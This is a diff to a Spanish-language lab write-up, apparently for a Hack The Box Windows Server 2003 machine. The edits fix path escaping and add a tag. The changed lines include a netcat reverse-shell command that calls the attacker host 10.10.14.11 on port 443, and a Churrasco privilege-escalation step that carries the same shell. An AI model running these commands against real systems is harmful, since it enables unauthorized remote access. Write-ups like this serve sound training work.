@@ -1,6 +1,6 @@
 ## Summary
 
-Tags: #Windows #HTTP #IIS #WebDav #ReverShell #BufferOverflow #RCE #JuicyPotato #Churrasco #Server2003
+Tags: #Windows #HTTP #IIS #WebDav #ReverShell #BufferOverflow #RCE #JuicyPotato #Churrasco #Server2003 #SearchSploit 
 
 - IP -> 10.10.11.130
 - Ports -> TCP (80), UDP (idk)
@@ -92,7 +92,7 @@ Compartimos el archivo a nivel de red para Windows, para después ejecutarlo des
 
 Ahora en la consola de la web hacemos lo siguiente:
 ```bash 
-\\10.10.14.11\smbFolder\nc.exe -e cmd 10.10.14.11 443
+\\10.10.14.11\\smbFolder\\nc.exe -e cmd 10.10.14.11 443
 
 	# e = Ejecutamos el Netcat con una cmd, que nos la enviaremos a nuestro equipo por el puerto 443
 ```
@@ -162,7 +162,7 @@ Descargamos el archivo de churracco.exe y lo compartimos a la maquina victima po
 
 En la consola de Windows para transferirnos el archivo, primero debemos de ir al dir **Temp** y después colocamos el siguiente comando. 
 ```python
-❯ copy \10.10.14.11\\smbFolder\\churrasco.exe churrasco.exe    # Nos copiamos un archivo .exe desde un recurso compartido SMB que se encuentra en nuestra maquina de atacante
+❯ copy \\10.10.14.11\\smbFolder\\churrasco.exe churrasco.exe    # Nos copiamos un archivo .exe desde un recurso compartido SMB que se encuentra en nuestra maquina de atacante
 
 	# IP = IP de atacante
 	# smbFolder = Nombre del folder del recurso compartido
@@ -172,7 +172,7 @@ En la consola de Windows para transferirnos el archivo, primero debemos de ir al
 
 Ejecutamos el churrasco de la siguiente manera
 ```bash 
-❯ churrasco.exe "\\10.10.14.11\smbFolder\nc.exe -e cmd 10.10.14.11 443"           # Al momento de ejecutar el churrasco debemos de colocar el comandos a ejecutar 
+❯ churrasco.exe "\\10.10.14.11\\smbFolder\\nc.exe -e cmd 10.10.14.11 443"           # Al momento de ejecutar el churrasco debemos de colocar el comandos a ejecutar 
 ```
 
 Pero antes compartirnos el Netcat a nivel de red para Windows, para después ejecutarlo desde el recurso compartido y el servidor de la maquina victima
